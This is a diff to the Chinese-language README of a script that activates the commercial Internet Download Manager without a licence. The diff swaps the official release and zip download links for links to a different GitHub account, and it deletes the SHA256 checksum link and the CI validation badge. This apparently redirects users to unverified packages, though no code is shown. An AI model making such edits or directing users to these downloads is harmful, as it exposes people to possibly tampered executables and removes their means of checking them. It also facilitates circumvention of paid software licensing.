@@ -1,6 +1,4 @@
 # IDM 激活脚本中文版 v1.3.9（IDM Activation Script · 简体中文）
-
-[![Windows validation](https://github.com/tytsxai/IDM-Activation-Script-Chinese/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/tytsxai/IDM-Activation-Script-Chinese/actions/workflows/ci.yml)
 [![License: GPL v3](https://img.shields.io/badge/License-GPL_v3-blue.svg)](./LICENSE)
 [![Version](https://img.shields.io/badge/version-v1.3.9-brightgreen.svg)](./CHANGELOG.md)
 [![Platform](https://img.shields.io/badge/platform-Windows%207%20%7C%208%20%7C%2010%20%7C%2011-blue.svg)](#系统要求)
@@ -78,13 +76,12 @@
 
 ## 📥 快速下载
 
-> **👉 直接下载按钮（推荐）**：[前往 GitHub Releases 页面下载最新版](https://github.com/tytsxai/IDM-Activation-Script-Chinese/releases/latest)  
+> **👉 直接下载按钮（推荐）**：[前往 GitHub Releases 页面下载最新版](https://github.com/jiangqiu6/IDM-Activation-Script-Chinese/releases/latest)  
 > 页面中 `Assets` 区域的 `.zip` 文件即为安装包，点击即下载。
 
 也可以在本仓库内直接下载（右键"链接另存为"）：
 
-- 最新版压缩包（点击右键另存为）：[IDM-Activation-Script-v1.3.9.zip](https://github.com/tytsxai/IDM-Activation-Script-Chinese/raw/main/release/IDM-Activation-Script-v1.3.9.zip)
-- 校验值（SHA256）：[IDM-Activation-Script-v1.3.9.zip.sha256](https://github.com/tytsxai/IDM-Activation-Script-Chinese/raw/main/release/IDM-Activation-Script-v1.3.9.zip.sha256)
+- 最新版压缩包（点击右键另存为）：[IDM-Activation-Script-v1.3.9.zip](https://github.com/jiangqiu6/IDM-Activation-Script-Chinese/raw/main/release/IDM-Activation-Script-v1.3.9.zip)
 - 完整更新历史：[CHANGELOG.md](./CHANGELOG.md)
 
 > **注**：v1.3.6 修复了"脚本目录不可写"的误报（环境自检写入测试语法错误），并把四个脚本合并为一个 `开始激活.cmd`；同时修复了安装目录含 `(x86)` 时提权报"此时不应有 \Internet"、以及 Win11 新版上 WMI 自检误报等问题。v1.3.7 在此基础上细化了"该选哪个激活模式"的说明；v1.3.8 为纯文档修订（统一上游署名、修正文档里过时的新手指引、补全发布说明索引），运行时脚本未改动。**v1.3.9 修复了 `IAS.cmd` 在部分 Win11 24H2/25H2 上"卡在正在初始化"的问题（改为优先 `Get-CimInstance`、失败回退旧版 WMI），并新增初始化分步进度提示**；这是运行时改动，建议已用旧版的用户重新下载 v1.3.9。
